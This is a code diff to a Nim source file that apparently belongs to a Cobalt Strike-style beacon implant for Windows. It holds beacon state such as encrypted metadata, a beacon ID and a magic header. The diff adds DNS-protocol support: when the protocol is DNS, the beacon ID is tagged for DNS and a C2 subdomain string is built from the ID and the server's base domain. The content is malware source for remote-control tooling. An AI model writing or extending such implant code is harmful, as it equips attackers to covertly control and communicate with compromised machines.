@@ -1,5 +1,5 @@
-import std/[random, os, math, strutils, net, endians, sequtils]
-import ./[crypt, utils]
+import std/[random, os, math, strformat, strutils, net, endians, sequtils]
+import ./[crypt, utils, config]
 import winim
 import winim/inc/windef
 
@@ -10,6 +10,7 @@ var
     meta_info_enc*: seq[byte]
     beacon_id*: int32
     magic_head: int32
+    dns_base_domain*: string
 
     # host
     os_arch*: int # for proc use
@@ -33,12 +34,12 @@ var
 GetNativeSystemInfo(&system_info)
 
 proc gen_beacon_id(): int32 = 
-     result = rand(0x7fffffff).int32
-     if result < 0x10000000: result += 0x10000000
-     # non DNS
-     result = result shr 1 shl 1
-     # DNS
-     # result = result shr 1 shl 1 or 1202
+    result = rand(0x10000000..0x7fffffff).int32
+    when protocol == "dns://":
+        result = result shr 1 shl 1 or 1202
+        dns_base_domain = result.toHex(8) & server_base_domain
+    else:
+        result = result shr 1 shl 1
 
 proc get_magic_head(): int32 = 0xbeef.int32
 
